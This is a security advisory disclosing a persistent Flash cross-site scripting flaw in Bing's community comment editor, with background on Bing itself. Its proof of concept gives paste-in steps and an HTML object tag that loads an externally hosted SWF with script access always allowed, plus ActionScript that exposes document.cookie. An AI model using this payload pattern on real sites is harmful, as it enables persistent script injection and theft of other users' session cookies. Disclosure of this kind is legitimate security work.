Introduction:
=============
Bing (formerly Live Search, Windows Live Search, and MSN Search) is a web search engine (advertised as a 
decision engine) from Microsoft. Bing was unveiled by Microsoft CEO Steve Ballmer on May 28, 2009 at the 
All Things Digital conference in San Diego. It went fully online on June 3, 2009, with a preview version 
released on June 1, 2009. Notable changes include the listing of search suggestions as queries are entered 
and a list of related searches (called Explore pane) based on semantic technology from Powerset that Microsoft 
purchased in 2008. On July 29, 2009, Microsoft and Yahoo! announced a deal in which Bing would power Yahoo! Search. 
All Yahoo! Search global customers and partners are expected to have made the transition by early 2012.
In October 2011, Bing announced it is working on new back-end search infrastructure, with the goal of delivering 
faster and slightly more relevant search results for users. Known as “Tiger,” the new index-serving technology is 
being incorporated into Bing globally starting in August 2011.

Critical


Details:
========
A persistent flash componente input validation vulnerability is detected on Microsofts Bing Service Application.
The vulnerability allows an attacker to implement malicious persistent comments when the user is editing or posting through Flash.
The vulnerability is located on the htmleditor input/output when processing to load manipualtes swf files which were created 
with flash action script.

Vulnerable Module(s):
                                                           [+] Comments & Edit - Flash Input/Output (Editor-HTML|Dev-Kit)

Picture(s):
                                                           ../1.png
                                                           ../2.png
                                                           ../3.png


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...

1) Either comment or start a new thread (http://www.bing.com/community/developer/f/13214/p/addpost.aspx).
2) Click on the html button, through which you can enter html source directly "HTML Source editor"
3) Paste the exploit code:


       <object type="application/x-shockwave-flash" data="http://www.subhohalder.com/xysecteam.swf" width="300" height="300">
           <param name="movie" value="http://www.subhohalder.com/xysecteam.swf" />
                 <param name="quality" value="high" />
                 <param name="scale" value="noscale" />
                 <param name="salign" value="LT" />
       <param name="allowScriptAccess" value="always" />
                 <param name="menu" value="false" />
            </object>


4) Click on update, and the document.cookie pop ups in alert

the vulnerable SWF is compiled from an ActionScript with the following code:


       class Main {

       static function main() {

       getURL('javascript:alert("XYSEC Team "+document.cookie)');

       }    }

                                                           ../poc1.zip


Risk:
=====
The security risk of the persistent flash componente is estimated as critical.
